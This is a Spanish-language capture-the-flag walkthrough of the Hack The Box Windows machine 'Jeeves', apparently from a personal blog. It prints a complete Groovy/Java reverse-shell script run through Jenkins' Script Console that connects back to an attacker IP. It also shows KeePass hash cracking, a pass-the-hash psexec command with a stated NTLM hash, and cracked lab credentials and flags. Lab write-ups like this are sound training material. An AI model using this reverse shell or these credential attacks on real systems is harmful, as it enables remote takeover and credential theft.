---
title: "Jeeves - WriteUp"
date: Sun Sep 01 2024 22:45:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, dirb, impacket, smb, crackmapexec, exploit, windows, gobuster]
image: /assets/img/htb-writeups/Pasted-image-20240219200329.png
---

{% include machine-info.html
  machine="Jeeves"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Jeeves](/assets/img/htb-writeups/Pasted-image-20240219200329.png)

---

---
Tags:         

---------

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240219200329.png)

Jeeves no es demasiado complicado, sin embargo, se centra en algunas técnicas interesantes y proporciona una gran experiencia de aprendizaje. Como el uso de flujos de datos alternativos no es muy común, algunos usuarios pueden tener dificultades para localizar la ruta de escalada correcta.

-------

#### ENUM

NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Feb 20 09:50:20 2024 as: nmap -sCV -p 80,135,445,50000 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nma
p-bootstrap.xsl -oN targeted -oX targetedXML 10.129.228.112
Nmap scan report for jeeves.htb (10.129.228.112)
Host is up (0.041s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-vulners-regex: 
|   /home.html: 
|_    cpe:/a:microsoft:iis:10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-20T13:50:29
|_  start_date: 2024-02-20T13:45:47
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
```

HTTP

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220095239.png)

HTTP:50000

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220095407.png)

Buscamos exploits en searchsploit y vemos esto:

```bash
Jetty 9.4.37.v20210219 - Information Disclosure                             | java/webapps/50438.txt
```

FUZZING
```bash
$ gobuster dir -u 'http://10.129.228.112:50000' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos a ver la ruta encontrada:

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220102159.png)

Tenemos un _Jenkins_ corriendo.

Nos vamos a "Manage Jenkins" > "Script Console" y vemos que podemos introducir _Groovy Script_ en JAVA. Por tanto, ahora lo que nos hace falta es un buen script que nos de una consola remota...

Este mismo nos servirá: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76?permalink_comment_id=3641529

```java
String host = "10.10.14.131";
int port = 443;
String cmd = "cmd.exe";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
  while (pi.available() > 0) so.write(pi.read());
  while (pe.available() > 0) so.write(pe.read());
  while (si.available() > 0) po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {
    p.exitValue();
    break;
  } catch (Exception e) {}
};
p.destroy();
s.close();
```

Lo copiamos en la consola y modificamos los parámetros "String Host" por nuestra IP y "String cmd" por el puerto de escucha que queramos.

Nos ponemos en escucha con NetCat y rlwrap y pulsamos sobre el botón "Run"

```bash
$ rlwrap nc -nlvp 443
```

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220110928.png)

Y voilá! Estamos dentro...

Podemos registrar la primera bandera que está en el escritorio del usuario _kohsuke_.

Vamos a ver los permisos que tenemos.

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220111922.png)

Tenemos el servicio "SeImpersonatePrivilege" habilitado, lo que quiere decir que podemos escalar mediante "potatos".

Seguimos enumerando y vemos un archivo de keepass dentro de la carpeta "Documents".

Nos la pasamos a nuestro equipo mediante "impacket-smbserver" o como queramos y la analizamos.

```bash
$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-keepass
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
```

Tenemos la contraseña de la base de datos de KeePass. Vamos a abrir el archivo.

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220120930.png)

Y estamos dentro. Hay muchas credenciales, las apuntamos todas y hacemos password spraying con _crackmapexec_ pero sin éxito.

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220121221.png)

También encontramos un hash, que se puede ver en la captura, nos lo copiamos y probamos si podemos hacer un "passthehash" con _psexec_.

```bash
$ impacket-psexec Administrator@10.129.228.112 -hashes :e0fb1fb85756c24235ff238cbe81fe00
```

![JEEVES](/assets/img/htb-writeups/Pasted-image-20240220121551.png)

Pero cuando vamos a registrar la bandera de Admin porque pensamos que ya está nos encontramos con este mensaje:

```PowerShell
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,394,890,240 bytes free

c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Bueno, aquí podemos hacer dos cosas, una es volvernos locos buscando el archivo con la bandera por todo el equipo o hacer como dice, buscar más profundamente...

Y a lo que se refiere es que miremos más profundamente en el propio archivo. Y aquí es donde entra en juego los ADS (Alternate Data Streams), que es un atributo de archivo propio de las particiones NTFS. 
Más info: https://es.wikipedia.org/wiki/Alternate_Data_Streams

Vamos a ver si estamos en lo cierto. Para empezar vamos a hacer un _dir_ con esteroides para ver qué nos encuentra:

```PowerShell
c:\Users\Administrator\Desktop> dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,392,354,816 bytes free
```

Y bingo! El archivo tiene datos alternativos. Cómo los sacamos?

Muy fácil, con el comando _more_:

```PowerShell
> more < hm.txt:root.txt

afbc5bd4b615a60648cec41c6ac92530
```

Y ahí está, ahora sí, la flag de Administrador.
---

**Última actualización**: 2024-09-01<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
